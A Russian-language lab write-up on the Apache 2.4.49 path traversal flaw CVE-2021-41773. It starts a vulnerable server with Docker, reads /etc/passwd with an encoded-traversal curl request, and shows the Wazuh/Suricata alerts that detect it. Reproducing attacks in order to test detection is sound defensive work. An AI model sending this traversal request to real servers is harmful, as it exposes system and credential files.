# CVE-2021-41773

Ошибка была обнаружена в изменении нормализации путей в Apache HTTP Server 2.4.49. Если файлы за пределами этих каталогов не защищены обычной конфигурацией по умолчанию "require all denied", запросы на их чтение могут быть успешными.&#x20;

### Эксплуатация уязвимости

Для запуска уязвимого Apache HTTP сервера выполните команды:

```
docker compose build
docker compose up -d
```

После запуска сервера по адресу http://ваш-ip:8080 будет доступна дефолтная страница с фразой "It works!"

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

Для воспроизведения уязвимости выполните команду:

```
curl -v --path-as-is http://ваш-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

> обратите внимание, что /icons/ должен быть существующим каталогом

Результатом выполнения команды будет вывод содержимого файла /etc/passwd

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

В Wazuh (https://ваш-ip/app/wazuh) мы можем увидеть соответствующие алерты от IDS Suricata об эксплуатации данной уязвимости и о выводе файла /etc/passwd в ответе на ваш запрос.

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
